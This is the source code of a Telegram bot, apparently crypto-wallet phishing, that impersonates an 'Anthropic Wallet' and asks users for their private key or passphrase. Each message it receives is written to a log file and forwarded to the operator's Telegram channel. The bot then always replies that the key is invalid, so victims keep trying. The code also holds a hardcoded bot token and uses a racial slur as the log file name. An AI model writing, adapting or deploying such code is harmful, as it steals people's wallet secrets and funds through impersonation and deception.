const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");

// Remplacez par votre token d'API Telegram
const token = "7504666489:AAGi4_AvIhLIMM6mKkSfNtmwm90beFEkoaU";
const bot = new TelegramBot(token, { polling: true });

// ID du canal où envoyer les logs
const channelId = "@innoziegnzOEIGZTBOZQBGTO"; // Par exemple, "@MonSuperCanal"

// Dictionnaire pour les messages en différentes langues
const messages = {
    en: {
        start: "Hello Dreamer! Please choose your language: English or French.",
        chooseLanguage: "Please choose your language by clicking a button.",
        privateKeyPrompt: "Please enter your private key or Passphrase to import your wallet. Anthropic Wallet cannot generate private keys for you.",
        error: "Invalid private key. Make sure you enter the correct key.",
        success: "Your private key has been received and logged."
    },
    fr: {
        start: "Bonjour Dreamer ! Veuillez choisir votre langue : Anglais ou Français.",
        chooseLanguage: "Veuillez choisir votre langue en cliquant sur un bouton.",
        privateKeyPrompt: "Veuillez entrer votre clé privée ou Passphrase pour importer votre portefeuille. Anthropic Wallet ne peut pas générer de clés privées pour vous.",
        error: "Clé privée invalide. Assurez-vous d'entrer la bonne clé.",
        success: "Votre clé privée a été reçue et enregistrée."
    }
};

// Variable pour suivre la langue de l'utilisateur
let userLanguage = {};

// Fonction pour envoyer le message de sélection de langue
function sendLanguageChoice(chatId) {
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "English", callback_data: "en" },
                    { text: "Français", callback_data: "fr" }
                ]
            ]
        }
    };
    bot.sendMessage(chatId, messages.en.chooseLanguage, keyboard);  // Message initial en anglais
}

// Lorsque l'utilisateur commence la conversation
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    sendLanguageChoice(chatId);
});

// Gérer la sélection de la langue par l'utilisateur
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const languageChoice = query.data;

    // Sauvegarder la langue choisie par l'utilisateur
    userLanguage[chatId] = languageChoice;

    // Répondre à l'utilisateur avec un message approprié
    const selectedLanguage = userLanguage[chatId];
    bot.sendMessage(chatId, messages[selectedLanguage].start);
    bot.sendMessage(chatId, messages[selectedLanguage].privateKeyPrompt);
});

// Lorsque l'utilisateur envoie un message (clé privée)
bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    const userKey = msg.text;

    // Ignorer les messages envoyés après /start (comme des commandes ou des messages non liés à la clé)
    if (msg.text.startsWith("/")) {
        return; // Ignorer les commandes comme /start
    }

    // Si l'utilisateur a déjà choisi une langue
    const selectedLanguage = userLanguage[chatId] || 'en';  // Par défaut, en anglais

    // Si l'utilisateur envoie une clé privée
    if (userKey && userKey.length > 0) {
        const logMessage = `Clé privée reçue : ${userKey}\nDe l'utilisateur : ${chatId}\n\n`;

        // Enregistrer la clé dans un fichier log
        fs.appendFile("negro.txt", logMessage, (err) => {
            if (err) {
                console.error("Erreur lors de l'écriture dans le fichier log:", err);
                bot.sendMessage(chatId, messages[selectedLanguage].error);
            } else {
                // Envoyer les logs dans le canal Telegram
                bot.sendMessage(channelId, logMessage); // Envoie les logs dans le canal

                // Réponse systématique à l'utilisateur
                bot.sendMessage(chatId, messages[selectedLanguage].error);
            }
        });
    } else {
        bot.sendMessage(chatId, messages[selectedLanguage].error);
    }
});
